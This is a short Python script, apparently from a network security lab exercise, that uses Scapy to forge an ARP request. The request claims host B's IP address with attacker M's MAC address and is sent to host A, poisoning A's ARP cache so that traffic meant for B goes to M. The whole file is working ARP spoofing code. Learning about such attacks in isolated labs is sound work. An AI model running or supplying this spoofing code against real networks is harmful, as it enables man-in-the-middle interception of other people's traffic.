from scapy.all import *
  
# Define
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
IP_M = "10.9.0.105"
MAC_M = "02:42:0a:09:00:69"

# ARP request
arp_request = Ether(dst="ff:ff:ff:ff:ff:ff", src=MAC_M) / ARP(
    hwsrc=MAC_M,
    psrc=IP_B,
    hwdst="00:00:00:00:00:00",
    pdst=IP_A,
    op=1  # ARP request
)

# Send
sendp(arp_request, iface="eth0")